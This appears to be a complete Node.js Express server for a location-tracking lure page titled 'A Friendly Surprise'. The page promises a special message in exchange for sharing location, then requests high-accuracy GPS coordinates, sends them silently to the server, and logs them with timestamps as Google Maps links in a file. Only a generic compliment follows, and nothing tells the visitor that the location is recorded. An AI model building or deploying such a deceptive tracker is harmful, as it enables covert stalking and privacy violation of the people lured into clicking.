import express from "express";
import fs from "fs-extra";

const app = express();
const PORT = process.env.PORT || 3000;

// Página principal
app.get("/", (req, res) => {
  res.send(`
  <!doctype html>
  <html>
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width,initial-scale=1" />
      <title>Friendly Surprise</title>
      <style>
        body { font-family: Arial, sans-serif; background: #f7fbff; color:#222; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; padding:20px; }
        .card { max-width:600px; background:white; border-radius:14px; box-shadow:0 6px 20px rgba(0,0,0,0.1); padding:28px; text-align:center; }
        h1 { margin:0 0 12px; font-size:1.6rem; }
        p { margin:0 0 18px; }
        button { background:#0077ff; color:white; border:none; padding:12px 20px; border-radius:10px; cursor:pointer; font-weight:600; font-size:1rem; }
      </style>
    </head>
    <body>
      <div class="card">
        <h1>✨ A Friendly Surprise ✨</h1>
        <p id="lead">Click below to share your location and unlock a special message.</p>
        <div id="action">
          <button id="shareBtn">Share my location</button>
        </div>
      </div>

      <script>
        const btn = document.getElementById('shareBtn');
        const action = document.getElementById('action');
        const lead = document.getElementById('lead');

        btn.addEventListener('click', () => {
          if (!navigator.geolocation) {
            lead.innerText = 'Geolocation is not supported by your browser. But here’s the surprise anyway: You are appreciated ❤️';
            return;
          }

          btn.disabled = true;
          btn.innerText = 'Requesting location…';

          navigator.geolocation.getCurrentPosition(position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Envia para o servidor
            fetch('/location?lat=' + lat + '&lon=' + lon).catch(()=>{});

            // Mostra só a mensagem final
            action.innerHTML = '<p style="font-size:1.2rem; color:#0077ff;">🌟 Thank you for being part of this surprise! You are truly appreciated. 🌟</p>';
            lead.innerText = '';
          }, error => {
            action.innerHTML = '<p style="font-size:1.2rem;">Even without sharing, here’s the surprise: You are amazing just the way you are 💙</p>';
            lead.innerText = '';
          }, { enableHighAccuracy: true, timeout: 10000 });
        });
      </script>
    </body>
  </html>
  `);
});

// Endpoint que grava localização
app.get("/location", (req, res) => {
  const lat = req.query.lat;
  const lon = req.query.lon;

  if (lat && lon) {
    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const logLine = `${new Date().toISOString()} | ${mapsLink}\n`;
    fs.appendFileSync("locations.txt", logLine);
    console.log("Location saved:", mapsLink);
  }
  res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
